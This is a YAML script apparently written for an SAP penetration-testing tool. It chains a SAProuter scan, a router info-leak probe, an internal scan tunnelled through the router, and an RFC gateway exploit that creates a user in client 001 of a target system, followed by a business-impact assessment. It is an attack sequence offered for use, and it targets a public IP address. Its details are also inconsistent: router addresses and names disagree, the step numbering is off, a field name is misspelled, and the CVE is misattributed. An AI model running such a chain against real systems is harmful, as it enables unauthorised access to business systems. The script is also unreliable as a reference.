# SAPMAP Script: SAProuter Discovery + Internal Scan
# Usage: python3 sapmap.py --script scripts/demo_saprouter.yaml
#
# Flow:
#   1. Add the SAProuter as a node (port 3299 on 192.168.2.209)
#   2. Scan it so SAPMAP classifies the node as SAPROUTER
#   3. Probe CVE-2017-12636 ROUTER_ADM info leak (may reveal routtab + peers)
#   4. Scan the internal host 192.168.2.29, instances 40-45, via the router
#
# Any SAP systems discovered in step 4 will automatically carry the
# SAProuter prefix, so follow-up actions (check_gw, betrusted, etc.)
# against those SIDs will tunnel through the router without extra setup.

name: "SAProuter Discovery + Internal Scan"
description: "Discover SAProuter RD1, test info leak, then scan internal host 192.168.2.29 (inst 40-45) through the tunnel"

# Slow the script down a little so the activity bar is readable.
step_delay: 2

steps:
  # --- 1. Register the SAProuter as a node --------------------------------
  - action: scan
    targets: "80.56.140.21"
    mode: fast
    tmeout: 600

  # --- 2. ROUTER_ADM info-leak probe (CVE-2017-12636) ---------------------
  - action: check_router_info
    target: R15

  # --- 3. Scan internal host via the SAProuter ----------------------------
  #   targets left empty would auto-extract from the info-leak result;
  #   here we target 192.168.2.29 explicitly, instances 40..45 only.
  - action: router_scan
    target: R15
    targets: "192.168.2.29"
    inst_from: 40
    inst_to: 45
    mode: sap              # "full" adds HANA (3NN15) + JAVA (5NN00/04)
    concurrency: 10
    timeout: 500

  # --- 4. Tidy the map so the new internal node is easy to spot -----------
  - action: layout
    mode: hierarchy

  # --- 5. Check RFC GW vuln for W74 and create a user in client 001
  - action: check_gw
    target: W74

  - action: create_user
    target: W74
    method: gw_exploit
    client: "001"

  # --- 6. Then check the business impact and highlight the attack chains
  - action: impact_assess
    target: W74
    client: "001"

  - action: impact_export
    target: W74

  - action: analyze_chains

  - action: highlight_chain
    index: 0

  - action: impact_show
    target: W74

